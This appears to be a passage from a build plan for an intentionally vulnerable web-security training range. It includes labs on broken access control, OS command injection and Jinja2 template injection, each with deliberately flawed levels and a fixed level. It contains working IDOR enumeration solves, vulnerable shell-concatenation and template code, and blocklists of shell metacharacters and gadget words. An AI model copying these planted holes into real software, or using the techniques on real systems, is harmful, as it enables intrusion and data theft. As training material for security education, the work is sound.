// labs/r02-courier/app/server.mjs — Courier. Start hook: build the in-memory store, planting HVWA_FLAG as parcel 1001's
// private note, then DELETE HVWA_FLAG from the environment (spec §6). The HTML dashboard uses a demo-session cookie so a
// plain browse works and shows only the demo customer's parcels; the JSON API uses a bearer token. Authorization (which
// parcels a session may read) is the flaw and is chosen by HVWA_LEVEL (store.canRead). Listens on 0.0.0.0:$HVWA_PORT.
import { createServer } from 'node:http';
import { createStore } from './store.mjs';
import { page, esc } from './render.mjs';

const LEVELS = ['acolyte', 'templar', 'divine'];
const level = LEVELS.includes(process.env.HVWA_LEVEL ?? '') ? process.env.HVWA_LEVEL : 'acolyte';
const port = Number(process.env.HVWA_PORT || 8080);

const flag = process.env.HVWA_FLAG;
delete process.env.HVWA_FLAG;
const store = createStore(level, flag);

const json = (res, status, obj) => { res.writeHead(status, { 'content-type': 'application/json', 'cache-control': 'no-store' }); res.end(JSON.stringify(obj)); };
const html = (res, status, body) => { res.writeHead(status, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' }); res.end(body); };
const bearer = (req) => (req.headers.authorization ?? '').replace(/^Bearer\s+/i, '') || undefined;
const cookieToken = (req) => Object.fromEntries((req.headers.cookie ?? '').split(';').map((c) => c.trim().split('=')))['cs'];

createServer((req, res) => {
  const url = new URL(req.url ?? '/', 'http://courier');
  const p = url.pathname;

  if (p === '/healthz') return json(res, 200, { status: 'ok' });

  // --- HTML: landing and the demo dashboard (browser side; cookie session so a plain GET works) ---
  if (p === '/' && req.method === 'GET') {
    return html(res, 200, page('Home',
      `<h2>Track your parcels</h2><p>Courier customers can follow every parcel from depot to door.</p>`
      + `<p><a class="btn" href="/dashboard">View demo dashboard</a></p>`));
  }
  if (p === '/dashboard' && req.method === 'GET') {
    let token = cookieToken(req);
    if (!store.customerFor(token)) { token = store.openDemoSession(); res.setHeader('set-cookie', `cs=${token}; Path=/; HttpOnly; SameSite=Lax`); }
    const mine = store.parcelsOf('demo').map((p) =>
      `<div class="parcel"><h3>Parcel #${p.id}</h3><div class="status">${esc(p.status)}</div>`
      + `<p>${esc(p.to)}</p><p><a href="/api/parcels/${p.id}/label">Print label</a></p></div>`).join('');
    return html(res, 200, page('Dashboard', `<h2>Your parcels</h2>${mine}`));
  }

  // --- JSON API ---
  if (p === '/api/session' && req.method === 'POST') {
    const token = store.openDemoSession();
    return json(res, 200, { token, customer: 'demo' });
  }
  const customer = store.customerFor(bearer(req));
  if (p.startsWith('/api/') && p !== '/api/session') {
    if (!customer) return json(res, 401, { error: 'sign in: POST /api/session' });

    if (p === '/api/parcels' && req.method === 'GET') {
      return json(res, 200, { parcels: store.parcelsOf(customer).map(({ id, to, status }) => ({ id, to, status })) });
    }
    const mDetail = p.match(/^\/api\/parcels\/(\d+)$/);
    const mLabel = p.match(/^\/api\/parcels\/(\d+)\/label$/);
    const mEvents = p.match(/^\/api\/parcels\/(\d+)\/events$/);
    const route = mDetail ? 'detail' : mLabel ? 'label' : mEvents ? 'events' : null;
    const id = route ? Number((mDetail ?? mLabel ?? mEvents)[1]) : null;
    if (route) {
      const parcel = store.parcel(id);
      if (!parcel) return json(res, 404, { error: 'no such parcel' });
      if (!store.canRead(customer, parcel, route)) return json(res, 403, { error: 'not your parcel' });
      if (route === 'detail') return json(res, 200, { id: parcel.id, to: parcel.to, status: parcel.status, note: parcel.note });
      if (route === 'label') return json(res, 200, { id: parcel.id, address: parcel.to, note: parcel.note });
      return json(res, 200, { id: parcel.id, events: [{ at: 'depot', status: parcel.status }] });
    }
    return json(res, 404, { error: 'unknown resource' });
  }

  return html(res, 404, page('Not found', `<p class="parcel">Page not found.</p>`));
}).listen(port, '0.0.0.0', () => console.log(`courier on :${port} (${level})`));
```

- [ ] **Step 8: The reference solves**

Courier's solves are ordinary HTTP-client logic — open a demo session, enumerate parcel ids (your own start at 2001, so 1xxx exist), and read the private `note`. There is no attack *string*, so these are shown in full; the "attack" is requesting an id you do not own, and the recon is the enumeration.

`labs/r02-courier/solve/acolyte.mjs`:

```js
// Reference solve — Courier, Acolyte. Open a demo session, then read a foreign parcel's detail directly (no ownership
// check). Enumerate the 1xxx id block (your own are 2xxx); the flag is a parcel's private delivery note.
const base = process.argv[2];
const { token } = await (await fetch(`${base}/api/session`, { method: 'POST' })).json();
const auth = { headers: { authorization: `Bearer ${token}` } };
for (let id = 1000; id <= 1010; id++) {
  const r = await fetch(`${base}/api/parcels/${id}`, auth);
  if (!r.ok) continue;
  const { note } = await r.json();
  const m = /HVWA\{[a-z2-7]{26}\}/.exec(note ?? '');
  if (m) { console.log(m[0]); break; }
}
```

`labs/r02-courier/solve/templar.mjs`:

```js
// Reference solve — Courier, Templar. The detail route now checks ownership (403), but the label route does not. Open a
// demo session, enumerate the 1xxx id block, and read each foreign parcel's label — the note rides along in the label.
const base = process.argv[2];
const { token } = await (await fetch(`${base}/api/session`, { method: 'POST' })).json();
const auth = { headers: { authorization: `Bearer ${token}` } };
for (let id = 1000; id <= 1010; id++) {
  const r = await fetch(`${base}/api/parcels/${id}/label`, auth);
  if (!r.ok) continue;
  const { note } = await r.json();
  const m = /HVWA\{[a-z2-7]{26}\}/.exec(note ?? '');
  if (m) { console.log(m[0]); break; }
}
```

- [ ] **Step 9: `README.md`**

`labs/r02-courier/README.md`:

```markdown
# Courier (r02) — Broken access control (Easy)

Courier is a parcel-tracking customer portal with a small JSON API. Getting a session is trivial (demo mode); the flaw
is that parcel resources do not consistently check *ownership*. The flag is parcel 1001's private delivery `note`
(owned by the `vault` customer), planted at start from `HVWA_FLAG` and scrubbed from the environment. Placement is
`custom` (an in-memory record).

## Vulnerable feature
The parcel API: `GET /api/parcels/:id`, `GET /api/parcels/:id/label`, `GET /api/parcels/:id/events`. The browser
dashboard shows only the demo customer's own parcels.

## Levels
- **Acolyte.** No route checks ownership. Open a demo session, enumerate the 1xxx id block, read the foreign note.
- **Templar.** `:id` (detail) now checks ownership and returns 403 for foreign parcels, so the Acolyte path fails. The
  `:id/label` sibling was not updated and still returns any parcel's label (with the note). The label route is
  discoverable from your own dashboard's "Print label" links. This is why Acolyte does not carry up.
- **Divine.** One `requireOwner` guard runs on every parcel route, comparing owner to the authenticated session. Every
  foreign id is 403. No flag; parcel 1001's note is a decoy.

## Reference solves
`solve/acolyte.mjs` and `solve/templar.mjs` are complete (no payload string: the attack is an id you do not own via an
unguarded route). `npm run labs:test -- --lab r02` proves each works at its level, that Acolyte fails at Templar and
Divine, and that Templar fails at Divine.
```

- [ ] **Step 10: Static gate** — `npx vitest run tests/labs-harness.spec.ts` (r02 cases pass).

- [ ] **Step 11: Black-box gate (Docker)** — `npm run labs:test -- --lab r02` → `labs:test OK`.

- [ ] **Step 12: Commit**

```bash
git add labs/r02-courier
git commit -m "feat(labs): r02 Courier — broken access control lab (3 levels)"
```

---
### Task 6: Lab r03 — Beacon (OS command injection with a real shell, Medium, Node + busybox)

**The application.** Beacon is a home-router admin panel (dark "network gear" theme, its own CSS). Pages: `/` (device dashboard), `/diagnostics` (a connectivity "name probe" tool — **the vulnerable feature**), `/status` (firmware/uptime), `/healthz`. The diagnostics tool runs a **real shell** (busybox `/bin/sh -c`) to probe a host the operator types. Because the rootfs is read-only, the flag file lives in the `/tmp` tmpfs.

**Flag placement (`file:/tmp/beacon/flag.txt`).** At start the app makes `/tmp/beacon/` and writes `HVWA_FLAG` to `flag.txt`, then deletes `HVWA_FLAG` from `process.env`. At Divine, `HVWA_FLAG` is absent and the file holds a decoy line. The flag is never rendered by any page; only a shell reading the file surfaces it.

The shell the tool runs (Acolyte/Templar) is built by concatenation around an echoed status line and a cosmetic probe:

```
echo "Diagnostics for <host>"; ping -c 1 -W 1 <host> 2>&1 || true
```

The echoed status line is what makes exfiltration deterministic without needing `CAP_NET_RAW` (the probe is `|| true`-guarded cosmetics): a command injected through `<host>` runs in the shell, and command substitution inside `<host>` lands in the `echo` output shown to the operator.

**The three levels — all the same flaw in the diagnostics tool.**

- **Acolyte (no defence).** `<host>` is concatenated straight into the `sh -c` string. *Intended path:* terminate the diagnostic command and append a command that reads the flag file (the operator's writable area is `/tmp`). *Class of input:* a string that ends the current command and runs a second one that reads the flag file.
- **Templar (a naive filter).** The tool rejects any host containing the chaining characters `;`, `&`, `|`, a backtick or a newline, believing those are the only ways to run a second command — then still concatenates into `sh -c`. The Acolyte `;`-style payload is refused. *Why Acolyte fails here:* its command separator is on the blocklist. *Intended path:* use shell **command substitution**, which contains none of the blocked characters, so the filter passes it, and let the substituted file contents land in the echoed status line. *Class of input:* a command-substitution expression (no `;&|` backtick newline) whose output is the flag.
- **Divine (the correct fix).** No shell: the probe runs `execFile('ping', ['-c','1','-W','1', host])` with an **argument array**, and `host` is first validated against a strict hostname/IP pattern (letters, digits, dots, hyphens only). User input is one argv element, never parsed by a shell, and metacharacters are rejected before that. *Why safe:* there is no shell to inject into and nothing that could chain or substitute a command. No flag exists at Divine.

**The image.** `node:22.23.5-alpine3.24` (ships busybox `/bin/sh` and `ping`), package managers and setuid/setgid stripped, non-root `10001:10001`, `HEALTHCHECK` on `/healthz`, Node standard library only (`node:http`, `node:child_process`).

**Files:**
- Create: `labs/r03-beacon/{lab.json,Dockerfile,.dockerignore,VERSION,README.md}`
- Create: `labs/r03-beacon/app/{server.mjs,diag.mjs,render.mjs,health.mjs}`
- Create: `labs/r03-beacon/seed/device.json`
- Create: `labs/r03-beacon/solve/{acolyte.mjs,templar.mjs}`

- [ ] **Step 1: `lab.json`, `VERSION`, `.dockerignore`**

`labs/r03-beacon/lab.json`:

```json
{
  "id": "r03",
  "slug": "beacon",
  "title": { "en": "Beacon router admin", "id": "Admin router Beacon" },
  "app": "Beacon",
  "category": "Command injection",
  "difficulty": "medium",
  "levels": ["acolyte", "templar", "divine"],
  "port": 8080,
  "health": "/healthz",
  "flag": { "placement": "file:/tmp/beacon/flag.txt" },
  "resources": { "memoryMiB": 128, "pids": 96 },
  "tmpfs": [{ "path": "/tmp", "sizeMiB": 16 }],
  "needsBot": false,
  "themeId": "beacon",
  "scenario": { "en": "A router admin panel whose diagnostics tool runs a real shell on what you type.", "id": "Panel admin router yang alat diagnostiknya menjalankan shell sungguhan atas masukan Anda." },
  "briefing": { "en": "Beacon's diagnostics let an operator probe a host. The router stores an operator secret in a file. Read it.", "id": "Diagnostik Beacon membiarkan operator memeriksa sebuah host. Router menyimpan rahasia operator dalam sebuah berkas. Baca berkas itu." },
  "hints": [
    { "id": 1, "cost": 10, "text": { "en": "The diagnostics page does something with the host you enter. What does it do with it?", "id": "Halaman diagnostik melakukan sesuatu dengan host yang Anda masukkan. Apa yang dilakukannya?" } },
    { "id": 2, "cost": 20, "text": { "en": "The probe runs in a real shell. A shell runs more than one command if you let it.", "id": "Probe berjalan di shell sungguhan. Shell menjalankan lebih dari satu perintah jika Anda membiarkannya." } },
    { "id": 3, "cost": 30, "text": { "en": "At Templar the obvious separators are blocked. A shell can run a command without any of them.", "id": "Di Templar pemisah yang jelas diblokir. Shell bisa menjalankan perintah tanpa satu pun dari mereka." } }
  ]
}
```

`labs/r03-beacon/VERSION`: `1.0.0`

`labs/r03-beacon/.dockerignore`:

```
solve
README.md
.dockerignore
VERSION
```

- [ ] **Step 2: `Dockerfile`**

`labs/r03-beacon/Dockerfile`:

```dockerfile
# labs/r03-beacon — OS command injection, Medium (Node + busybox shell). One image, three levels by HVWA_LEVEL. Runtime
# contract: plan 2026-11-20-range-a-platform.md "Interfaces for Plans B–E". The flag file lives in the /tmp tmpfs.
FROM node:22.23.5-alpine3.24
RUN rm -rf /usr/local/lib/node_modules/npm /usr/local/lib/node_modules/corepack \
    /usr/local/bin/npm /usr/local/bin/npx /usr/local/bin/corepack /usr/local/bin/yarn /usr/local/bin/yarnpkg /opt/yarn-v* \
 && (find / -xdev -type f -perm /6000 -exec chmod a-s {} + 2>/dev/null || true)
WORKDIR /app
COPY app/ ./
COPY seed/ ./seed/
COPY lab.json ./lab.json
USER 10001:10001
EXPOSE 8080
HEALTHCHECK --interval=2s --timeout=2s --start-period=30s --start-interval=500ms --retries=3 CMD ["node", "/app/health.mjs"]
CMD ["node", "/app/server.mjs"]
```

- [ ] **Step 3: `app/health.mjs`** (same probe pattern)

```js
const port = Number(process.env.HVWA_PORT || 8080);
fetch(`http://127.0.0.1:${port}/healthz`, { signal: AbortSignal.timeout(1500) })
  .then((r) => process.exit(r.ok ? 0 : 1), () => process.exit(1));
```

- [ ] **Step 4: `seed/device.json`**

```json
{ "model": "Beacon B-6", "firmware": "2.4.1", "uptime": "6 days, 4 hours", "wan": "fibre", "lan": "192.168.1.1/24" }
```

- [ ] **Step 5: `app/diag.mjs` — the per-level probe**

`labs/r03-beacon/app/diag.mjs`:

```js
// labs/r03-beacon/app/diag.mjs — Beacon's connectivity probe, per level. The echoed status line makes the result
// deterministic without CAP_NET_RAW; the ping is cosmetic (|| true). acolyte/templar run a REAL shell (busybox sh -c);
// divine runs no shell at all.
import { execFile } from 'node:child_process';

const HOSTNAME_RE = /^[A-Za-z0-9.-]{1,253}$/;                 // divine's strict allow-list
const BLOCKED = /[;&|`\n\r]/;                                 // templar's naive blocklist (misses $() substitution)

/** Run the probe for `host` at `level`; resolves { output } (combined stdout+stderr) or { error }. */
export function probe(level, host) {
  return new Promise((resolve) => {
    if (level === 'divine') {
      if (!HOSTNAME_RE.test(host)) return resolve({ error: 'Enter a valid hostname or IP address.' });
      return execFile('ping', ['-c', '1', '-W', '1', host], { timeout: 4000 },
        (_err, stdout, stderr) => resolve({ output: `${stdout}${stderr}` || 'Probe finished.' }));
    }
    if (level === 'templar' && BLOCKED.test(host)) return resolve({ error: 'That host contains characters that are not allowed.' });
    // acolyte and templar: host is concatenated into a real shell command.
    const cmd = `echo "Diagnostics for ${host}"; ping -c 1 -W 1 ${host} 2>&1 || true`;
    execFile('/bin/sh', ['-c', cmd], { timeout: 4000 }, (_err, stdout, stderr) => resolve({ output: `${stdout}${stderr}` }));
  });
}
```

- [ ] **Step 6: `app/render.mjs` — the Beacon theme**

`labs/r03-beacon/app/render.mjs`:

```js
// labs/r03-beacon/app/render.mjs — the Beacon "network gear" look (its own small CSS) and HTML helpers. Probe output is
// shown inside a <pre> and HTML-escaped; the injection is in the shell (diag.mjs), not in the markup.
export const esc = (s) => String(s).replace(/[&<>"']/g, (c) => `&#${c.charCodeAt(0)};`);

const CSS = `
:root{--bg:#0f141b;--panel:#161d27;--line:#28323f;--lime:#8bd450;--ink:#d7e0ea;--mut:#7d8aa0}
*{box-sizing:border-box}body{margin:0;font:15px/1.5 "DejaVu Sans Mono",ui-monospace,monospace;background:var(--bg);color:var(--ink)}
header{background:var(--panel);border-bottom:2px solid var(--lime);padding:14px 22px}
header h1{margin:0;font-size:18px;color:var(--lime);letter-spacing:1px}header span{color:var(--mut);font-size:12px}
main{max-width:740px;margin:24px auto;padding:0 16px}
nav a{color:var(--lime);text-decoration:none;margin-right:16px}
.panel{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:16px;margin:14px 0}
input,button{font:inherit}input{background:#0b0f15;border:1px solid var(--line);color:var(--ink);padding:9px;border-radius:6px;width:60%}
button{background:var(--lime);color:#0b0f15;border:0;border-radius:6px;padding:9px 16px;font-weight:700;cursor:pointer;margin-left:8px}
pre{background:#0b0f15;border:1px solid var(--line);border-radius:6px;padding:12px;overflow:auto;color:var(--ink)}
table{width:100%;border-collapse:collapse}td{border-bottom:1px solid var(--line);padding:7px 6px;color:var(--mut)}
`;

export function page(title, bodyHtml) {
  return `<!doctype html><html lang="en"><head><meta charset="utf-8">`
    + `<meta name="viewport" content="width=device-width, initial-scale=1">`
    + `<title>${esc(title)} — Beacon</title><style>${CSS}</style></head><body>`
    + `<header><h1>BEACON</h1><span>Router administration</span></header>`
    + `<main><nav><a href="/">Dashboard</a><a href="/diagnostics">Diagnostics</a><a href="/status">Status</a></nav>${bodyHtml}</main></body></html>`;
}
```

- [ ] **Step 7: `app/server.mjs` — start hook, routing, the diagnostics POST**

`labs/r03-beacon/app/server.mjs`:

```js
// labs/r03-beacon/app/server.mjs — Beacon. Start hook: write HVWA_FLAG (or a Divine decoy) to /tmp/beacon/flag.txt, then
// DELETE HVWA_FLAG from the environment (spec §6). /diagnostics runs the per-level probe (diag.mjs). No page renders the
// flag file; only a shell that reads it does. Listens on 0.0.0.0:$HVWA_PORT.
import { createServer } from 'node:http';
import { mkdirSync, writeFileSync, readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { probe } from './diag.mjs';
import { page, esc } from './render.mjs';

const LEVELS = ['acolyte', 'templar', 'divine'];
const level = LEVELS.includes(process.env.HVWA_LEVEL ?? '') ? process.env.HVWA_LEVEL : 'acolyte';
const port = Number(process.env.HVWA_PORT || 8080);
const device = JSON.parse(readFileSync(join(dirname(fileURLToPath(import.meta.url)), 'seed', 'device.json'), 'utf8'));

const flag = process.env.HVWA_FLAG;
delete process.env.HVWA_FLAG;
mkdirSync('/tmp/beacon', { recursive: true });
writeFileSync('/tmp/beacon/flag.txt',
  `${level === 'divine' || !flag ? 'Divine is the secure reference: the probe runs no shell, so there is nothing to inject.' : flag}\n`,
  { mode: 0o400 });

const html = (res, status, body) => { res.writeHead(status, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' }); res.end(body); };
const readBody = (req) => new Promise((resolve) => { let b = ''; req.on('data', (c) => { b += c; if (b.length > 4096) req.destroy(); }); req.on('end', () => resolve(b)); });

const diagForm = (host = '', output = '') =>
  `<div class="panel"><h2>Connectivity diagnostics</h2>`
  + `<form method="post" action="/diagnostics"><input name="host" value="${esc(host)}" placeholder="host to probe"><button>Run probe</button></form>`
  + (output ? `<pre>${esc(output)}</pre>` : '') + `</div>`;

createServer(async (req, res) => {
  const url = new URL(req.url ?? '/', 'http://beacon');
  const p = url.pathname;

  if (p === '/healthz') { res.writeHead(200, { 'content-type': 'application/json' }); return res.end('{"status":"ok"}'); }

  if (p === '/' && req.method === 'GET') {
    return html(res, 200, page('Dashboard', `<div class="panel"><h2>${esc(device.model)}</h2><p>Firmware ${esc(device.firmware)} • WAN ${esc(device.wan)} • LAN ${esc(device.lan)}</p></div>`));
  }
  if (p === '/status' && req.method === 'GET') {
    const rows = Object.entries(device).map(([k, v]) => `<tr><td>${esc(k)}</td><td>${esc(String(v))}</td></tr>`).join('');
    return html(res, 200, page('Status', `<div class="panel"><h2>Device status</h2><table>${rows}</table></div>`));
  }
  if (p === '/diagnostics' && req.method === 'GET') return html(res, 200, page('Diagnostics', diagForm()));
  if (p === '/diagnostics' && req.method === 'POST') {
    const body = new URLSearchParams(await readBody(req));
    const host = body.get('host') ?? '';
    const r = await probe(level, host);
    return html(res, 200, page('Diagnostics', diagForm(host, r.error ?? r.output)));
  }

  return html(res, 404, page('Not found', `<div class="panel">Page not found.</div>`));
}).listen(port, '0.0.0.0', () => console.log(`beacon on :${port} (${level})`));
```

- [ ] **Step 8: The reference solves (payload left to the implementer)**

Both solves POST `host=<input>` to `/diagnostics` and read the flag out of the `<pre>` output. The injected command is an attack payload, so the plan leaves the exact string blank with a precise description; `npm run labs:test -- --lab r03` proves it.

`labs/r03-beacon/solve/acolyte.mjs`:

```js
// Reference solve — Beacon, Acolyte. /diagnostics concatenates the host into a real `sh -c`. INJECTION must end the
// diagnostic command and run a second command that reads the flag file (the operator's writable area is /tmp; the file
// is /tmp/beacon/flag.txt). Implementer-supplied; the plan hard-codes no shell payload by design.
const base = process.argv[2];
const INJECTION = '';   // <- implementer supplies this per the prose (end the command, read the flag file).
const res = await fetch(`${base}/diagnostics`, {
  method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({ host: INJECTION }),
});
const m = (await res.text()).match(/HVWA\{[a-z2-7]{26}\}/);
if (m) console.log(m[0]);
```

`labs/r03-beacon/solve/templar.mjs`:

```js
// Reference solve — Beacon, Templar. The tool blocks ; & | backtick and newline, then still concatenates into `sh -c`.
// INJECTION must contain none of those yet still run a command — use command substitution so the flag file's contents
// are substituted into the echoed status line. Implementer-supplied.
const base = process.argv[2];
const INJECTION = '';   // <- implementer supplies this per the prose (command substitution, no ; & | backtick newline).
const res = await fetch(`${base}/diagnostics`, {
  method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({ host: INJECTION }),
});
const m = (await res.text()).match(/HVWA\{[a-z2-7]{26}\}/);
if (m) console.log(m[0]);
```

- [ ] **Step 9: `README.md`**

`labs/r03-beacon/README.md`:

```markdown
# Beacon (r03) — OS command injection (Medium)

Beacon is a home-router admin panel. Its diagnostics tool probes a host the operator types by running a real busybox
shell. The flag is a file (`/tmp/beacon/flag.txt`, in the tmpfs because the rootfs is read-only), written at start from
`HVWA_FLAG` and then scrubbed from the environment. No page renders the file; only a shell reading it does.

## Vulnerable feature
`POST /diagnostics` — the connectivity probe. The shell string is `echo "Diagnostics for <host>"; ping -c 1 -W 1
<host> 2>&1 || true`; the echoed line makes exfiltration deterministic without `CAP_NET_RAW` (the ping is cosmetic).

## Levels
- **Acolyte.** `<host>` is concatenated straight into `sh -c`. End the command and read the flag file.
- **Templar.** The tool rejects `; & | ` backtick and newline, then still concatenates. The Acolyte separator is
  blocked, so it fails. Command substitution contains none of those; its output lands in the echoed status line.
- **Divine.** No shell: `execFile('ping', ['-c','1','-W','1', host])` with an argument array, and `host` is validated
  against a strict hostname/IP pattern first. Nothing can chain or substitute a command. No flag.

Note: `ping` may lack `CAP_NET_RAW` under the range hardening and fail; that is intentional and irrelevant — the flaw
and the flag path run through `echo`/the shell, not through a successful ping.

## Reference solves
`solve/acolyte.mjs` and `solve/templar.mjs` are HTTP clients; the shell payload is left to the implementer. `npm run
labs:test -- --lab r03` proves each works at its level and that the Acolyte payload fails at Templar and Divine.
```

- [ ] **Step 10: Static gate** — `npx vitest run tests/labs-harness.spec.ts` (r03 cases pass).

- [ ] **Step 11: Black-box gate (Docker)** — `npm run labs:test -- --lab r03` → `labs:test OK`.

- [ ] **Step 12: Commit**

```bash
git add labs/r03-beacon
git commit -m "feat(labs): r03 Beacon — OS command injection lab (3 levels)"
```

---
### Task 7: Lab r04 — Postcard (server-side template injection, Hard, Python + Flask/Jinja2)

**The application.** Postcard is a greeting-card maker (soft pastel theme, its own CSS) built on real Flask/Jinja2. Pages: `/` (pick a card style, write a message, preview it), `POST /preview` (renders the finished card — **the vulnerable feature**), `/gallery` (sample cards), `/healthz`. The card preview renders the operator's message through Jinja2. Because the rootfs is read-only, the flag file lives in the `/tmp` tmpfs.

**Flag placement (`file:/tmp/postcard/flag.txt`).** At start the app makes `/tmp/postcard/` and writes `HVWA_FLAG` to `flag.txt` (mode `0444`, readable by the app's own uid), then pops `HVWA_FLAG` from `os.environ`. At Divine, `HVWA_FLAG` is absent and the file holds a decoy line. No page renders the file; only template code that reads it does.

**The three levels — all the same flaw in the card preview.**

- **Acolyte (no defence).** The message is concatenated into the card's template string and rendered with `render_template_string(card)`, so the message is parsed as Jinja2. *Intended path:* a template expression that walks Python's object graph from a literal to `open()` and emits the flag file's contents into the card. *Class of input:* a Jinja2 expression that reaches a file-read primitive and prints the flag file.
- **Templar (a naive filter).** Before rendering, the message is rejected if its raw text contains a double underscore (`__`) or any of the obvious gadget words (`os`, `popen`, `import`, `subprocess`, `eval`, `exec`) — a keyword/WAF-style blacklist — and otherwise is still concatenated into the template. The literal Acolyte payload (which spells out `__class__`/`os`…) is refused. *Why Acolyte fails here:* its gadget names and dunders appear verbatim and match the blacklist. *Intended path:* build those same names without any blocked substring appearing literally — e.g. Jinja string-escape sequences and the `attr` filter / bracket access to assemble the attribute names at render time — then read the flag file as before. *Class of input:* the same object-graph file read, with every blocked token composed from escapes/pieces so the raw message matches nothing on the blacklist.
- **Divine (the correct fix).** The message is never template source: the card is a **constant** template (`{{ message }}`) and the user's text is passed as a bound value — `render_template_string(CARD, message=msg)` — so Jinja autoescapes it as data. *Why safe:* user input is a value, never parsed as a template; there is no object graph to reach. No flag exists at Divine.

**The image.** `python:3.13.18-alpine3.24`, pinned Flask stack via `requirements.txt` (installed from wheels — MarkupSafe ships musllinux wheels for cp313, so no C toolchain is needed), pip and setuid/setgid bits stripped, non-root `10001:10001`, `HEALTHCHECK` on `/healthz`, `PYTHONDONTWRITEBYTECODE=1`.

**Files:**
- Create: `labs/r04-postcard/{lab.json,Dockerfile,.dockerignore,VERSION,README.md}`
- Create: `labs/r04-postcard/app/{app.py,templating.py,health.py,requirements.txt}`
- Create: `labs/r04-postcard/seed/cards.json`
- Create: `labs/r04-postcard/solve/{acolyte.mjs,templar.mjs}`

- [ ] **Step 1: `lab.json`, `VERSION`, `.dockerignore`**

`labs/r04-postcard/lab.json`:

```json
{
  "id": "r04",
  "slug": "postcard",
  "title": { "en": "Postcard greeting-card maker", "id": "Pembuat kartu ucapan Postcard" },
  "app": "Postcard",
  "category": "Template injection",
  "difficulty": "hard",
  "levels": ["acolyte", "templar", "divine"],
  "port": 5000,
  "health": "/healthz",
  "flag": { "placement": "file:/tmp/postcard/flag.txt" },
  "resources": { "memoryMiB": 192, "pids": 96 },
  "tmpfs": [{ "path": "/tmp", "sizeMiB": 16 }],
  "needsBot": false,
  "themeId": "postcard",
  "scenario": { "en": "A greeting-card maker that renders your message as a template.", "id": "Pembuat kartu ucapan yang merender pesan Anda sebagai templat." },
  "briefing": { "en": "Postcard turns your message into a printed card. The press keeps a studio secret in a file. Make the card print it.", "id": "Postcard mengubah pesan Anda menjadi kartu cetak. Percetakan menyimpan rahasia studio dalam sebuah berkas. Buat kartu mencetaknya." },
  "hints": [
    { "id": 1, "cost": 15, "text": { "en": "Preview a card and look closely at how your exact message comes back.", "id": "Pratinjau sebuah kartu dan perhatikan baik-baik bagaimana pesan Anda kembali." } },
    { "id": 2, "cost": 30, "text": { "en": "The press renders your message with a template engine. What does the engine do with its own syntax?", "id": "Percetakan merender pesan Anda dengan mesin templat. Apa yang dilakukan mesin dengan sintaksnya sendiri?" } },
    { "id": 3, "cost": 45, "text": { "en": "At Templar certain words and double underscores are refused outright. The engine can still be handed those names if they are never spelled out.", "id": "Di Templar kata-kata tertentu dan garis bawah ganda ditolak langsung. Mesin tetap bisa menerima nama itu jika tidak pernah dieja." } }
  ]
}
```

`labs/r04-postcard/VERSION`: `1.0.0`

`labs/r04-postcard/.dockerignore`:

```
solve
README.md
.dockerignore
VERSION
```

- [ ] **Step 2: `app/requirements.txt`**

```
Flask==3.1.3
Jinja2==3.1.6
Werkzeug==3.1.9
MarkupSafe==3.0.4
itsdangerous==2.2.0
click==8.5.1
blinker==1.9.0
```

- [ ] **Step 3: `Dockerfile`**

`labs/r04-postcard/Dockerfile`:

```dockerfile
# labs/r04-postcard — Server-side template injection, Hard (real Flask/Jinja2). One image, three levels by HVWA_LEVEL.
# Runtime contract: plan 2026-11-20-range-a-platform.md "Interfaces for Plans B–E". The flag file lives in the /tmp tmpfs.
# Flask stack is pinned and installed from wheels (no C toolchain: MarkupSafe ships musllinux wheels for cp313).
FROM python:3.13.18-alpine3.24
ENV PYTHONDONTWRITEBYTECODE=1 PYTHONUNBUFFERED=1
WORKDIR /app
COPY app/requirements.txt ./requirements.txt
RUN pip install --no-cache-dir -r requirements.txt \
 && rm -rf /usr/local/bin/pip /usr/local/bin/pip3 /usr/local/bin/pip3.* /root/.cache \
 && (find / -xdev -type f -perm /6000 -exec chmod a-s {} + 2>/dev/null || true)
COPY app/ ./
COPY seed/ ./seed/
COPY lab.json ./lab.json
USER 10001:10001
EXPOSE 5000
HEALTHCHECK --interval=2s --timeout=2s --start-period=30s --start-interval=500ms --retries=3 CMD ["python", "/app/health.py"]
CMD ["python", "/app/app.py"]
```

- [ ] **Step 4: `app/health.py`**

`labs/r04-postcard/app/health.py`:

```python
# The image's HEALTHCHECK: exit 0 when the app answers lab.json's health path (/healthz), else 1.
import os, sys, urllib.request
port = os.environ.get("HVWA_PORT", "5000")
try:
    with urllib.request.urlopen(f"http://127.0.0.1:{port}/healthz", timeout=1.5) as r:
        sys.exit(0 if r.status < 300 else 1)
except Exception:
    sys.exit(1)
```

- [ ] **Step 5: `seed/cards.json`**

```json
[
  { "style": "Birthday", "sample": "Wishing you a wonderful year ahead." },
  { "style": "Thank you", "sample": "Thank you so much for your kindness." },
  { "style": "Congratulations", "sample": "So proud of everything you have achieved." }
]
```

- [ ] **Step 6: `app/templating.py` — the per-level card renderer**

`labs/r04-postcard/app/templating.py`:

```python
# labs/r04-postcard/app/templating.py — Postcard's card renderer, per level. The flaw is that at acolyte/templar the
# operator's message becomes Jinja2 TEMPLATE SOURCE; at divine it is a bound value. Real Jinja2 is used deliberately
# (spec §2: real execution inside the isolated container).
import re
from flask import render_template_string

# Templar's naive blacklist: refuse the obvious gadget words and double underscores in the raw message.
_BLOCKED = re.compile(r"__|os|popen|import|subprocess|eval|exec", re.IGNORECASE)

_CARD = (
    '<div class="card {cls}">'
    '<div class="flourish">&#10047;</div>'
    '<p class="msg">{body}</p>'
    '<div class="sign">— with love from Postcard</div>'
    "</div>"
)

def render_card(level: str, style_class: str, message: str) -> str:
    if level == "divine":
        # The message is a bound value, never template source: Jinja autoescapes it as data.
        card = _CARD.format(cls=style_class, body="{{ message }}")
        return render_template_string(card, message=message)
    if level == "templar" and _BLOCKED.search(message or ""):
        return '<div class="card"><p class="msg">That message was rejected by the print filter.</p></div>'
    # acolyte and templar: the message is concatenated into the template string, so Jinja parses it.
    card = _CARD.format(cls=style_class, body=message)
    try:
        return render_template_string(card)
    except Exception:
        return '<div class="card"><p class="msg">The press could not print that card.</p></div>'
```

- [ ] **Step 7: `app/app.py` — start hook, routing, the Postcard theme**

`labs/r04-postcard/app/app.py`:

```python
